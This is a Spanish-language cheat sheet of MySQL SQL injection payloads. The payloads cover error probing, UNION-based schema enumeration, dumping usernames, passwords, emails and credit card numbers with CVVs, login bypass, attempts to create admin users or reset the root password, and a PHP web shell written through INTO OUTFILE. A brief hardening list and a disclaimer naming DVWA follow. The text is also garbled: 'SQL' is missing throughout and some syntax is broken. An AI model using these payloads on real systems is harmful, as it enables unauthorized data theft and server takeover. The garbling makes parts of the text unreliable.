# 📌 Manual de Injection en My

## 🛠 1. Identificar si una entrada es vulnerable

### 1.1. Probar si hay error de

Colocamos una comilla en la entrada para ver si genera un error:

```
'
```

### 1.2. Intentar autenticación bypass con condición OR

```
' OR '1'='1
```

### 1.3. Verificar si la inyección afecta a consultas numéricas

```
1 OR 1=1
```

---

## 📌 2. Obtener información básica de My

### 2.1. Obtener la versión de la base de datos

```
' UNION SELECT @@version, NULL; --
```

### 2.2. Obtener el nombre de la base de datos actual

```
' UNION SELECT database(), NULL; --
```

### 2.3. Obtener el usuario actual de la base de datos

```
' UNION SELECT user(), NULL; --
```

### 2.4. Obtener los usuarios de la base de datos

```
' UNION SELECT user, NULL FROM my.user; --
```

---

## 📌 3. Enumerar bases de datos y tablas

### 3.1. Listar todas las bases de datos

```
' UNION SELECT schema_name, NULL FROM information_schema.schemata; --
```

### 3.2. Listar todas las tablas de la base de datos actual

```
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = database(); --
```

### 3.3. Listar todas las columnas de una tabla específica

```
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users'; --
```

---

## 📌 4. Extraer información sensible

### 4.1. Obtener usuarios y contraseñas de una tabla de usuarios

```
' UNION SELECT user, password FROM users; --
```

### 4.2. Obtener correos electrónicos almacenados

```
' UNION SELECT user,email FROM users; --
```

### 4.3. Obtener tarjetas de crédito (si existen en la base de datos 😈)

```
' UNION SELECT card_number, card_cvv FROM credit_cards; --
```

---

## 📌 5. Bypass de autenticación

### 5.1. Iniciar sesión sin contraseña

```
' OR '1'='1' --
```

### 5.2. Iniciar sesión con usuario específico

```
' OR username='admin' --
```

---

## 📌 6. Escalar privilegios en My

### 6.1. Verificar si el usuario actual tiene privilegios de administrador

```
' UNION SELECT user, host, authentication_string FROM my.user; --
```

### 6.2. Intentar crear un nuevo usuario administrador

' UNION SELECT "GRANT ALL PRIVILEGES ON _._ TO 'hacker'@'%' IDENTIFIED BY 'password';"; --

### 6.3. Cambiar la contraseña del usuario root

' UNION SELECT "UPDATE my.user SET authentication_string=PASSWORD('nueva_contraseña') WHERE user='root';"; --

---

## 📌 7. Cargar archivos maliciosos (Web Shells)

### 7.1. Escribir un archivo en el servidor (Web Shell en PHP)

```
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'; --
```

---

## 📌 8. Blindar la base de datos contra Injection

Si eres administrador, usa estas medidas para evitar ataques:

✅ _Usar consultas preparadas_ con myi o PDO en PHP.  
✅ _Restringir permisos_ de usuarios en la base de datos.  
✅ _Validar y escapar datos_ de entrada correctamente.  
✅ _Configurar un firewall (WAF)_ para bloquear patrones de Injection.

---

## ⚠ _Aviso Legal_

Este documento es solo para _fines educativos y pruebas en entornos controlados_ como Dojo o DVWA. _Usar estas técnicas sin permiso es ilegal._

---

_📌 Autor:_ [Tu Nombre o Alias]  
🚀 _Última actualización:_ 2025
